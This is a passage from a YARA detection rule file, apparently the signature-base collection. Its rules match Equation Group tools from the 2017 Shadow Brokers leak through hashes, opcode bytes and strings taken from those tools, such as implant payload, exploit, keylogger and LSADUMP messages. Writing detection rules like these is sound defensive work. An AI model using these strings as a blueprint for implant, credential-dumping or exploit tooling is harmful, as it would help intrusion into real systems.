      $s3 = ".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@" fullword ascii
      $s4 = "Corporation. All rights reserved." fullword wide
      $s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 }

      $op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 }
      $op2 = { c6 44 24 56 64 88 5c 24 57 }
      $op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f }
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and ( 2 of ($s*) or all of ($op*) )
}

rule EquationGroup_Toolset_Apr17_PC_Level3_http_exe {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "3e855fbea28e012cd19b31f9d76a73a2df0eb03ba1cb5d22aafe9865150b020c"
      id = "9bb4224e-f900-5f5c-8091-088a4b791ada"
   strings:
      $s1 = "Copyright (C) Microsoft" fullword wide

      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }
      $op2 = { 44 24 4e 41 88 5c 24 4f ff }
      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_Toolset_Apr17_ParseCapture {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "c732d790088a4db148d3291a92de5a449e409704b12e00c7508d75ccd90a03f2"
      id = "11743260-c5ce-59de-9fcf-0c050eee98ff"
   strings:
      $x1 = "* Encrypted log found.  An encryption key must be provided" fullword ascii
      $x2 = "encryptionkey = e.g., \"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\"" fullword ascii
      $x3 = "Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_ActiveDirectory_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "33c1b7fdee7c70604be1e7baa9eea231164e62d5d5090ce7f807f43229fe5c36"
      id = "1069cabe-7c09-522f-ad3f-05651490b921"
   strings:
      $s1 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
      $s2 = "(&(objectClass=user)(objectCategory=person)" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PC_Legacy_dll : HIGHVOL {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "0cbc5cc2e24f25cb645fb57d6088bcfb893f9eb9f27f8851503a1b33378ff22d"
      id = "254ff1f7-52ee-57fa-be02-2904e132e25c"
   strings:
      $op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 }
      $op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 }
      $op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_svctouch {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "96b6a3c4f53f9e7047aa99fd949154745e05dc2fd2eb21ef6f0f9b95234d516b"
      id = "a1246afa-32ba-5730-91a2-b1116160d662"
   strings:
      $s1 = "Causes: Firewall,Machine down,DCOM disabled\\not supported,etc." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_pwd_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "ee72ac76d82dfec51c8fbcfb5fc99a0a45849a4565177e01d8d23a358e52c542"
      id = "69d071f0-7214-5972-805a-3c0c1d2346c2"
   strings:
      $s1 = "7\"7(7/7>7O7]7o7w7" fullword ascii

      $op1 = { 40 50 89 44 24 18 FF 15 34 20 00 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_KisuComms_Target_2000 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "94eea1bad534a1dc20620919de8046c9966be3dd353a50f25b719c3662f22135"
      id = "693a82e5-a3f1-5a56-b33d-0daef36bbe5f"
   strings:
      $s1 = "363<3S3c3l3q3v3{3" fullword ascii
      $s2 = "3!3%3)3-3135393@5" fullword ascii

      /* Recommendation - verify the opcodes on Binarly : http://www.binar.ly */
      /* Test each of them in the search field & reduce length until it generates matches */
      $op0 = { eb 03 89 46 54 47 83 ff 1a 0f 8c 40 ff ff ff 8b }
      $op1 = { 8b 46 04 85 c0 74 0f 50 e8 34 fb ff ff 83 66 04 }
      $op2 = { c6 45 fc 02 8d 8d 44 ff ff ff e8 d2 2f 00 00 eb }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and ( all of ($s*) or all of ($op*) ) )
}

rule EquationGroup_Toolset_Apr17_SlDecoder {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "b220f51ca56d9f9d7d899fa240d3328535f48184d136013fd808d8835919f9ce"
      id = "1760e84b-fc40-5d60-9351-3a3134af9e9f"
   strings:
      $x1 = "Error in conversion. SlDecoder.exe <input filename> <output filename> at command line " fullword wide
      $x2 = "KeyLogger_Data" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Windows_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "d38ce396926e45781daecd18670316defe3caf975a3062470a87c1d181a61374"
      id = "a82aac49-8843-5420-8b87-f3d7431bc63f"
   strings:
      $s2 = "0#0)0/050;0M0Y0h0|0" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}

rule EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "9ab667b7b5b9adf4ff1d6db6f804824a22c7cc003eb4208d5b2f12809f5e69d0"
      hash2 = "320144a7842500a5b69ec16f81a9d1d4c8172bb92301afd07fb79bc0eca81557"
      hash3 = "c10f4b9abee0fde50fe7c21b9948a2532744a53bb4c578630a81d2911f6105a3"
      hash4 = "551174b9791fc5c1c6e379dac6110d0aba7277b450c2563e34581565609bc88e"
      hash5 = "8419866c9058d738ebc1a18567fef52a3f12c47270f2e003b3e1242d86d62a46"
      id = "cb6d4098-8ede-58ba-9851-7c8b360fb606"
   strings:
      $s1 = "PQRAPAQSTUVWARASATAUAVAW" fullword ascii
      $s2 = "SQRUWVAWAVAUATASARAQAP" fullword ascii
      $s3 = "iijymqp" fullword ascii
      $s4 = "AWAVAUATASARAQI" fullword ascii
      $s5 = "WARASATAUAVM" fullword ascii

      $op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc }
      $op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 }
      $op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of ($s*) or all of ($op*) )
}

rule EquationGroup_Toolset_Apr17_SetCallback {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "a8854f6b01d0e49beeb2d09e9781a6837a0d18129380c6e1b1629bc7c13fdea2"
      id = "3c06fc74-2e75-5348-bb62-30c724de1414"
   strings:
      $s2 = "*NOTE: This version of SetCallback does not work with PeddleCheap versions prior" fullword ascii
      $s3 = "USAGE: SetCallback <input file> <output file>" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "052e778c26120c683ee2d9f93677d9217e9d6c61ffc0ab19202314ab865e3927"
      hash2 = "5db457e7c7dba80383b1df0c86e94dc6859d45e1d188c576f2ba5edee139d9ae"
      id = "f662c961-80be-5453-86b1-c4d40ac5b732"
   strings:
      $x1 = "DFReader.exe logfile AESKey [-j] [-o outputfilename]" fullword ascii
      $x2 = "Double Feature Target Version" fullword ascii
      $x3 = "DoubleFeature Process ID" fullword ascii

      $op1 = { a1 30 21 41 00 89 85 d8 fc ff ff a1 34 21 41 00 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_Toolset_Apr17__vtuner_vtuner_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "3e6bec0679c1d8800b181f3228669704adb2e9cbf24679f4a1958e4cdd0e1431"
      hash2 = "b0d2ebf455092f9d1f8e2997237b292856e9abbccfbbebe5d06b382257942e0e"
      id = "3794f30b-39dc-59eb-9fd3-4c7837bfd47d"
   strings:
      $s1 = "Unable to get -w hash.  %x" fullword wide
      $s2 = "!\"invalid instruction mnemonic constant Id3vil\"" fullword wide
      $s4 = "Unable to set -w provider. %x" fullword wide

      $op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 }
      $op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
      hash4 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
      id = "6c653b0a-fda4-51d6-bf90-bd637547fe47"
   strings:
      $s1 = "Target is share name" fullword ascii
      $s2 = "Could not make UdpNetbios header -- bailing" fullword ascii
      $s3 = "Request non-NT session key" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "3e181ca31f1f75a6244b8e72afaa630171f182fbe907df4f8b656cc4a31602f6"
      hash2 = "c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd"
      hash3 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash4 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
      hash5 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
      id = "9dc9ed95-5233-56e1-b8f1-4f27f43e7e43"
   strings:
      $x1 = "* Listening Post DLL %s() returned error code %d." fullword ascii

      $s1 = "WsaErrorTooManyProcesses" fullword ascii
      $s2 = "NtErrorMoreProcessingRequired" fullword ascii
      $s3 = "Connection closed by remote host (TCP Ack/Fin)" fullword ascii
      $s4 = "ServerErrorBadNamePassword" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of ($s*) or 1 of ($x*) )
}

rule EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "3bee31b9edca8aa010a4684c2806b0ca988b2bcc14ad0964fec4f11f3f6fb748"
      hash2 = "2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26"
      id = "658d6f7d-2164-5e43-b5a5-d9bea9cd2e27"
   strings:
      $s4 = "* Failed to connect to destination - %u" fullword wide
      $s6 = "* Failed to convert destination address into sockaddr_storage values" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__AddResource {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "e83e4648875d4c4aa8bc6f3c150c12bad45d066e2116087cdf78a4a4efbab6f0"
      hash2 = "5a04d65a61ef04f5a1cbc29398c767eada367459dc09c54c3f4e35015c71ccff"
      id = "cbba38fa-a906-5463-ae46-2b9c9f1bf8e0"
   strings:
      $s1 = "%s cm 10 2000 \"c:\\MY DIR\\myapp.exe\" c:\\MyResourceData.dat" fullword ascii
      $s2 = "<PE path> - the path to the PE binary to which to add the resource." fullword ascii
      $s3 = "Unable to get path for target binary." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17__ESKE_RPC2_8 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash2 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
      id = "694a1afc-7fea-58ac-b736-44957bbc0334"
   strings:
      $s4 = "Fragment: Packet too small to contain RPC header" fullword ascii
      $s5 = "Fragment pickup: SmbNtReadX failed" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "c7bf4c012293e7de56d86f4f5b4eeb6c1c5263568cc4d9863a286a86b5daf194"
      hash2 = "d92928a867a685274b0a74ec55c0b83690fca989699310179e184e2787d47f48"
      hash3 = "2d963529e6db733c5b74db1894d75493507e6e40da0de2f33e301959b50f3d32"
      hash4 = "e9f6a84899c9a042edbbff391ca076169da1a6f6dfb61b927942fe4be3327749"
      hash5 = "d989d610b032c72252a2df284d0b53f63f382e305de2a18b453a0510ab6246a3"
      hash6 = "23d98bca1f6e2f6989d53c2f2adff996ede2c961ea189744f8ae65621003b8b1"
      hash7 = "d7ae24816fda190feda6a60639cf3716ea00fb63a4bd1069b8ce52d10ad8bc7f"
      id = "0bf57f93-0a03-5241-94b8-1cd69f22b055"
   strings:
      $x1 = "Injection Lib -  " wide
      $x2 = "LSADUMP - - ERROR" wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ETBL_ETRE_10 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
      hash2 = "e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2"
      id = "7dfff868-cb66-51c0-a7c7-5cc872232b86"
   strings:
      $x1 = "Probe #2 usage: %s -i TargetIp -p TargetPort -r %d [-o TimeOut] -t Protocol -n IMailUserName -a IMailPassword" fullword ascii
      $x6 = "** RunExploit ** - EXCEPTION_EXECUTE_HANDLER : 0x%08X" fullword ascii
      $s19 = "Sending Implant Payload.. cEncImplantPayload size(%d)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash3 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
      hash4 = "e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2"
      hash5 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
      id = "d6848065-377b-5eda-821d-d2cc16f483cc"
   strings:
      $x1 = "Target is vulnerable" fullword ascii
      $x2 = "Target is NOT vulnerable" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
      hash4 = "e702223ab42c54fff96f198611d0b2e8a1ceba40586d466ba9aadfa2fd34386e"
      id = "63c7733c-9942-56f3-95cc-f3e72b693739"
   strings:
      $x2 = "** CreatePayload ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17__ELV_ESKE_13 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      id = "8bc3c47c-7357-5692-86aa-e43b40f8c1ab"
   strings:
      $x1 = "Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored." fullword ascii
      $s2 = "ERROR: pGvars->pIntRideAreaImplantPayload is NULL" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "fbe3a4501654438f502a93f51b298ff3abf4e4cad34ce4ec0fad5cb5c2071597"
      hash2 = "7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309"
      id = "b3b7037b-d08e-5b32-93ec-870f8ce088ac"
   strings:
      $s1 = "DEC Pathworks TCPIP service on Windows NT" fullword ascii
      $s2 = "<\\\\__MSBROWSE__> G" fullword ascii
      $s3 = "<IRISNAMESERVER>" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
      hash4 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
      id = "f671a10d-f0b8-5343-97b5-e60b7f2f0acf"
   strings:
      $x1 = "** SendAndReceive ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
      $s8 = "Binding to RPC Interface %s over named pipe" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
      hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
      hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
      id = "2749227b-13e2-5669-a557-567ebd170a2f"
   strings:
      $x1 = "ERROR: TbMalloc() failed for encoded exploit payload" fullword ascii
      $x2 = "** EncodeExploitPayload ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
      $x4 = "** RunExploit ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
      $s6 = "Sending Implant Payload (%d-bytes)" fullword ascii
      $s7 = "ERROR: Encoder failed on exploit payload" fullword ascii
      $s11 = "ERROR: VulnerableOS() != RET_SUCCESS" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
      hash2 = "e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2"
      hash3 = "7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309"
      id = "88bf610d-1c6e-554a-af82-46b5eb3cc6a5"
   strings:
      $x1 = "ERROR: Connection terminated by Target (TCP Ack/Fin)" fullword ascii
      $s2 = "Target did not respond within specified amount of time" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-17
   Identifier: Equation Group Tool Output
   Reference: Internal Research
*/

/* Rule Set ----------------------------------------------------------------- */

rule EquationGroup_scanner_output {
   meta:
      description = "Detects output generated by EQGRP scanner.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-04-17"
      id = "a73bc98f-f7b1-5f16-bf23-1d5c9a7a371b"
   strings:
      $s0 = "# scanning ip  " ascii
      $s1 = "# Scan for windows boxes" ascii fullword
      $s2 = "Going into send" ascii fullword
      $s3 = "# Does not work" ascii fullword
      $s4 = "You are the weakest link, goodbye" ascii fullword
      $s5 = "rpc   Scan for RPC  folks" ascii fullword
   condition:
      filesize < 1000KB and 2 of them
}
